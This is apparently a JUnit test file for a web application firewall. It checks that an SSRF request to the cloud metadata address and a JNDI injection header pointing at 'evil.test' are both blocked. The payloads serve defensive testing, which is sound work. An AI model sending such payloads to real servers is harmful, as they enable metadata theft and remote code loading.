package com.aluer.security;

import org.junit.jupiter.api.Test;

import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertTrue;

class WebApplicationFirewallTest {

    @Test
    void blocksSsrfPayloadsTargetingMetadataService() {
        WebApplicationFirewall firewall = new WebApplicationFirewall();

        WebApplicationFirewall.WAFResult result = firewall.checkRequest(
            "203.0.113.10",
            "GET",
            "/api/proxy",
            "url=http://169.254.169.254/latest/meta-data/",
            Map.of("User-Agent", "JUnit"),
            null
        );

        assertTrue(result.isBlocked());
        assertTrue(result.getMatchedRules().contains("SSRF_ATTACK"));
    }

    @Test
    void blocksJndiInjectionPayloads() {
        WebApplicationFirewall firewall = new WebApplicationFirewall();

        WebApplicationFirewall.WAFResult result = firewall.checkRequest(
            "203.0.113.11",
            "POST",
            "/login",
            null,
            Map.of("X-Api-Version", "${jndi:ldap://evil.test/a}"),
            null
        );

        assertTrue(result.isBlocked());
        assertTrue(result.getMatchedRules().contains("JNDI_INJECTION"));
    }
}
